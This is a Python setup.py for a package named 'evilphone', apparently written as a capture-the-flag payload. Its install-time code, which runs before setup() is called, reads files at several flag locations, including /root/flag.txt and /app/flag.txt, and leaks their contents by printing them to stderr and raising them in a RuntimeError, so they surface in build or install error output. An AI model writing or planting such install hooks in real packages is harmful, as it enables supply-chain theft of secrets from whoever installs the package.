from setuptools import setup
import sys

paths = [
    "/flag.txt",
    "/flag",
    "/app/flag.txt",
    "/tmp/flag.txt",
    "/root/flag.txt",
]

out = []
out.append("=== CTF FLAG SEARCH START ===")

for p in paths:
    try:
        with open(p, "r", errors="replace") as f:
            out.append(f"=== {p} ===")
            out.append(f.read())
    except Exception as e:
        out.append(f"{p}: {e}")

out.append("=== CTF FLAG SEARCH END ===")

print("\n".join(out), file=sys.stderr)
raise RuntimeError("\n".join(out))

setup(
    name="evilphone",
    version="0.0.1",
    packages=["evilphone"],
)
